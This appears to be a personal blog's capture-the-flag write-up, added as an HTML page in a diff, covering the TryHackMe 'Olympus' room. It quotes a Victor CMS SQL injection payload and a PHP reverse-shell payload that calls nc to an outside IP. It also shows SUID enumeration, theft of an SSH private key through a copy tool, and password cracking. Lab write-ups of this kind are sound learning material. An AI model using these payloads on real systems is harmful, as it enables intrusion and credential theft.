@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <link rel="icon" type="image/png" sizes="32x32" href="../images/favicon-32x32.png">
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>1do7 | Try Hack Me: Olympus</title>
+        <link rel="stylesheet" href="../style.css">
+    </head>
+    <body>
+        <div class="topnav">
+            <a class="active" href="../index.html">Home</a>
+            <a class="active" href="../about.html">Who The Fuck Am I?</a>
+            <p dir="rtl"><b>Idot#8152</b></p>
+          </div>
+        <div>
+            <h1>THM Olympus Write-up</h1>
+        <p>
+            I'll be using rustscan <i>(again)</i> because my shitty wi-fi can't keep up with nmap and i get false reports 99% of the time or have to wait for 2 hours for a full port scan.<br>
+            Looking at the results there's nothing special going on in here. Just a website and ssh.<br>
+            <img src="https://i.imgur.com/kf7ubiY.png"><br>
+            Let's check out the website.<br>
+            The website refers to olympus.thm so I added olympus.thm inside my /etc/hosts file like this:<br>
+            Remember my box's ip address might be different from yours. Don't just write what you see.<br>
+            <img src="https://i.imgur.com/FtBiJYt.png"><br>
+            Looks like the site is moved to somewhere else inside the same domain.<br>
+            <img src="https://i.imgur.com/nQrzbRS.png", width="1000"><br>
+            Let's enumerate directories.<br>
+            I ran gobuster with serval wordlists over and over again and I discovered the old site was located in /~webmaster.<br>
+            <img src="https://i.imgur.com/6xOWXEe.png"><br>
+            I'll use feroxbuster with the same wordlist to enumerate the site even more.<br>
+            It looks like there's an admin page on the website. But it refers us to index.html as soon as we enter it.<br>
+            This is really shitty security since the site gives us a 301 response instead of blocking us by returning 403.<br>
+            <img src="https://i.imgur.com/ek1U09z.png"><br>
+            We can just access the admin panel and take a look around if we use burpsuite and edit the respone from 301 to 200 ok.<br>
+            If you want to know more about Execute After Redirect vulnerabilities I reccomend you take a look at <a href="https://www.youtube.com/watch?v=LI9mw1rMKVw&t=390s">IppSec's Previse Write-up</a>.<br>
+            <img src="https://i.imgur.com/Xfnsk4N.png"><br>
+            <img src="https://i.imgur.com/zSsmEx9.png"><br>
+            It looks like there's another domain called chat.olympus.thm<br>
+            <img src="https://i.imgur.com/ZV7tcQk.png", width="1000"><br>
+            I added it to my /etc/hosts file like I did before.<br>
+            Let's look at it.<br>
+            <img src="https://i.imgur.com/prPMIec.png", width="1000"><br>
+            I found a bonus XSS vulnerability :P<br>
+            <img src="https://i.imgur.com/OJ8MGy9.png"><br>
+            <img src="https://i.imgur.com/SECcTiq.png"><br>
+            I couldn't find a way to log in, so let's take a step back.<br>
+            We know that the site is built with Victor CMS.<br>
+            Looking at issues in Victor CMS's github repository it looks like the creator of this made a shitty job when it comes to security.<br>
+            It also looks like he doesn't give a fuck abot fixing it any time soon. 😂<br>
+            <img src="https://i.imgur.com/OPLFsAu.png", width="1000"><br>
+            Let's try #14!<br>
+            We need to type "AAA' UNION SELECT 1, 2, (SELECT @@version), (SELECT user()), (SELECT database()),6,(SELECT system_user()),8,9,10 -- A" to test for the vulnerability.<br>
+            <img src="https://i.imgur.com/FADOnAZ.png", width="1000"><br>
+            The exploit didn't work but we got an error message, I ain't smart/stupid enough to read the source code and figure out an exploit on my own so I'm gonna use sqlmap.<br>
+            Let's dump the databeses<br>
+            <img src="https://i.imgur.com/YfHpN9a.png"><br>
+            There's two interesting databeses named phpmyadmin and Olympus.<br>
+            Let's dump tables for Olympus.<br>
+            <img src="https://i.imgur.com/Z0xQh0J.png"><br>
+            We have found our first flag! 1 out of 4 :(<br>
+            <img src="https://i.imgur.com/VqRMXRn.png"><br>
+            We also have a private chat?<br>
+            <img src="https://i.imgur.com/TvnE8M1.png", width="1000"><br>
+            This might be it!<br>
+            oh no, idk what to at this point :((<br>
+            <img src="https://i.imgur.com/eVji88c.png"><br>
+            Sike, we can still crack the user's passwords <img src="http://clipart-library.com/images_k/troll-face-transparent-png/troll-face-transparent-png-1.png", width="20"><br>
+            <img src="https://i.imgur.com/dyhsH3Z.png", width="1000"><br>
+            Looking at the source code on Victor CMS, we can see that it uses password_hash to encrypt user passwords.<br>
+            <img src="https://i.imgur.com/7KhKVM6.png"><br>
+            I wrote a php brute forcer myself but it was slow as hell so I just ended up using hashcat with seclist's probable 1200 wordlist or idk I forgot the name.<br>
+            <img src="https://i.imgur.com/7Gfoc2X.png"><br>
+            <img src="https://i.imgur.com/bNR4wDS.png"><br>
+            after running hashcat I could only find the password for the prometheus user.<br>
+            <img src="https://i.imgur.com/VhgmH1Y.png"><br>
+            Let's try loging into chat.olympus.thm and olympus.thm.<br>
+            We're in. 🕵<br>
+            <img src="https://i.imgur.com/b4zllNM.png", width="1000"><br>
+            Hold up, when we discovered the private chat we could see the ACTUAL file name even though it was "made using special random name function". If we can upload a php shell we might be able to find and execute it.<br>
+            SQLMap is a dumb as fuck so I had to manually remove my old output file for it to see new stuff.<br>
+            <img src="https://i.imgur.com/bLknZhY.png"><br>
+            for anyone wondering this is the payload i'll be using:<br>
+            <textarea cols="100"><?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.18.63.50 90 >/tmp/f") ?></textarea><br>
+            Anyways lets get shell.<br>
+            I'm in, again.<br>
+            <img src="https://i.imgur.com/bLknZhY.png", width="1000"><br>
+            we got anther flag inside zeus's home folder<br>
+            <img src="https://i.imgur.com/LH2hGUe.png"><br>
+            We need to get into zeus's frist account in order to priv esc.<br>
+            I ran linpeas but nothing useful came out.<br>
+            however I found out there was python3 on the box so I moved to an interactive shell because it's cooler or something idk<br>
+            <img src="https://i.imgur.com/zkVMIGK.png"><br>
+            we cant run sudo -l<br>
+            let's check for perms we have using this command:<br>
+            <textarea cols="100">find / -perm -u=s -type f 2>/dev/null</textarea><br>
+            <img src="https://i.imgur.com/YCDIyJk.png"><br>
+            I searched for cputils online and nothing came up, maybe this is a special tool?<br>
+            looks like we can copy files using it.<br>
+            <img src="https://i.imgur.com/NB0Bf0B.png"><br>
+            Let's investigate more.<br>
+            We can run this file privilaged as zeus.<br>
+            <img src="https://i.imgur.com/xAEZfvN.png"><br>
+            We know that this box has port 22 open and zeus has a directory called .ssh so let's get zeus's id_rsa private key.<br>
+            <img src="https://i.imgur.com/Smp82TH.png"><br>
+            It needs a passphrase. (I'm so done with this box.)<br>
+            <img src="https://i.imgur.com/stP7D7Q.png"><br>
+            damn it let's use ssh2john.<br>
+            <img src="https://i.imgur.com/Tj0VhBG.png"><br>
+            <img src="https://i.imgur.com/vnqAEZw.png"><br>
+            we got the passphrase. <img src="https://c.tenor.com/u9aJKcYcQpgAAAAi/pog-champ.gif", width="20"><br>
+            <img src="https://i.imgur.com/oKfrtTD.png"><br>
+            Ayo, wtf???<br>
+            <img src="https://i.imgur.com/UUk9Orv.png", width="1000"><br>
+            We're not root so we can't run nc<br>
+            <img src="https://i.imgur.com/OnWsIJD.png"><br>
+            This is how we get privilaged??<br>
+            <img src="https://i.imgur.com/VbMM3f5.png"><br>
+            we can just run this at our normal shell :/<br>
+            bruh 💀<br>
+            finnaly :o<br>
+            <img src="https://i.imgur.com/zTIcP24.png"><br>
+            we have a note:<br>
+            <textarea cols="110">PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look for it ;)</textarea><br>
+            I got an interactive shell again using python.<br>
+            maybe this will work?? :p<br>
+            <textarea cols="50">grep -r flag{ /</textarea><br>
+            This took forever to run.<br>
+            <img src="https://i.imgur.com/yDFfUH8.png", width="1000"><br>
+        </p>
+        </div>
+    </body>
+</html>
